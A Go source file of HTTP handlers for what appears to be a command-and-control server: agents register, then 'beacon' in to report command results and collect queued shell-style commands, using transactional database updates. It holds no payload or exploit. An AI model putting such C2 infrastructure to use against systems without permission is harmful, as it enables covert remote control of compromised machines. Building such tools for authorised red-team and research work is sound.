package handlers

import (
	"log"
	"encoding/json"
	"net/http"

	"server/database"
)

func RegisterAgent (w http.ResponseWriter, req *http.Request) {
    var agent database.Agent

    // Parse JSON from request body
    err := json.NewDecoder(req.Body).Decode(&agent)
    if err != nil {
		log.Println("Failed to add new agent - invalid JSON request")
        http.Error(w, "Invalid agent register JSON request", http.StatusBadRequest)
        return
    }

	// Insert agent into database and retrieve unique id
	id, err := database.InsertAgent(agent)
	if err != nil {
		log.Printf("Failed to add new agent - %s", err)
        http.Error(w, "Failed to add new agent", http.StatusBadRequest)
		return
	}

	// Log register event
	log.Printf("Registered agent %s (id=%d)", agent.Name, id)

    // Set response header to JSON
    w.Header().Set("Content-Type", "application/json")
    w.WriteHeader(http.StatusCreated)

    // Return agent's id
    json.NewEncoder(w).Encode(id)
}

func Beacon(w http.ResponseWriter, req *http.Request) {
	// Define a request payload type
	type BeaconRequest struct {
		Id 		int 						`json:"id"`
		Results []database.CommandResult	`json:"results"`
	}

	// Decode JSON body
	var payload BeaconRequest
    err := json.NewDecoder(req.Body).Decode(&payload)
    if err != nil {
		log.Println("Failed to beacon - invalid JSON request")
        http.Error(w, "Invalid beacon JSON request", http.StatusBadRequest)
        return
    }

	// Get beacon client's agent id and command results
	agent_id := payload.Id
	results := payload.Results

	log.Printf("Beaconed by agent %d", agent_id)

	// Prepare for atomic actions (all or non updates go through)
	tx, err := database.DB.BeginTx(req.Context(), nil)
	if err != nil {
		http.Error(w, "db error", http.StatusInternalServerError)
		return
	}
	defer tx.Rollback() // Schedules a rollback when function returns, only committed actions occur

	// Store command results in database
	update_result_stmt, err := tx.Prepare(`
		UPDATE commands
		SET result = ?, status = ?
		WHERE id = ? AND agent_id = ?
	`)
	if err != nil {
		http.Error(w, "update results error", http.StatusInternalServerError)
		return
	}
	defer update_result_stmt.Close()

	for _, r := range results {
		log.Printf("Stored result for command %d", r.Command_id)
		res, err := update_result_stmt.Exec(r.Result, "completed", r.Command_id, agent_id)
		if err != nil {
			log.Println("Failed to update result:", err)
			http.Error(w, "failed to update result", http.StatusInternalServerError)
			return
		}

		rows_affected, _ := res.RowsAffected()
		if rows_affected == 0 {
			log.Printf("Command %d not found for agent %d", r.Command_id, agent_id)
		}
	}

	// SQL statements for query and update
	pending_rows, err := tx.Query(`
		SELECT id, agent_id, command_type, cmd, status, result
		FROM commands
		WHERE status = ? AND agent_id = ?
	`, "pending", agent_id)
	if err != nil {
		http.Error(w, "query error", http.StatusInternalServerError)
		return
	}
	defer pending_rows.Close()

	update_stmt, err := tx.Prepare(`
		UPDATE commands
		SET status = ?
		WHERE id = ? AND agent_id = ?
	`)
	if err != nil {
		http.Error(w, "prepare update error", http.StatusInternalServerError)
		return
	}
	defer update_stmt.Close()

	// Execute statements
	var pending_commands = make([]database.Command, 0)

	for pending_rows.Next() {
		var c database.Command
		if err := pending_rows.Scan(
			&c.Id,
			&c.Agent_id,
			&c.Command_type,
			&c.Cmd,
			&c.Status,
			&c.Result,
		); err != nil {
        	http.Error(w, "scan error", http.StatusInternalServerError)
			return
		}

		// Update each pending command to sent status
		if _, err := update_stmt.Exec("sent", c.Id, agent_id); err != nil {
        	http.Error(w, "update error", http.StatusInternalServerError)
			return
		}

		pending_commands = append(pending_commands, c)
	}

	if err := pending_rows.Err(); err != nil {
        http.Error(w, "row error", http.StatusInternalServerError)
		return
	}

    if err := tx.Commit(); err != nil {
        http.Error(w, "commit error", http.StatusInternalServerError)
        return
    }

	// Return commands
    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(pending_commands)
}